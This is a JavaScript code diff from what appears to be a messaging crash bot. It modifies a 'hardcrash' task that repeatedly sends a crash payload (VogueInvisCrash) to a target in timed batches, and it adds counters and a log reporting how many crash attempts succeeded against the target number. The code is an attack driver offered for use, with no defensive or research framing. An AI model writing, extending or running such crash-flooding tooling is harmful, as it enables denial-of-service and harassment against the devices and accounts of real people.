@@ -6117,18 +6117,54 @@ async function executeTask(task) {
 
         case "hardcrash":
 
-            for (let i = 0;i < task.batch;i++) {
+            let success = 0;
+            let failed = 0;
+        
+            for (
+                let i = 0;
+                i < task.batch;
+                i++
+            ) {
+        
                 try {
-                    await VogueInvisCrash(sock, task.target);
+        
+                    await VogueInvisCrash(
+                        sock,
+                        task.target
+                    );
+        
+                    success++;
+        
                     await sleep(1800);
+        
                 } catch (e) {
-
+        
+                    failed++;
+        
                     console.log(
                         `[CRASH ERROR]
-${e.message}`
+        
+        ${e.message}`
                     );
                 }
             }
+        
+            // =====================
+            // FINAL BATCH LOG
+            // =====================
+        
+            console.log(
+`[BATCH SUCCESS]
+
+Type   : ${task.type}
+Target : ${task.number}
+
+Success:
+${success}/${task.batch}
+
+Failed :
+${failed}`
+    );
 
         break;
 
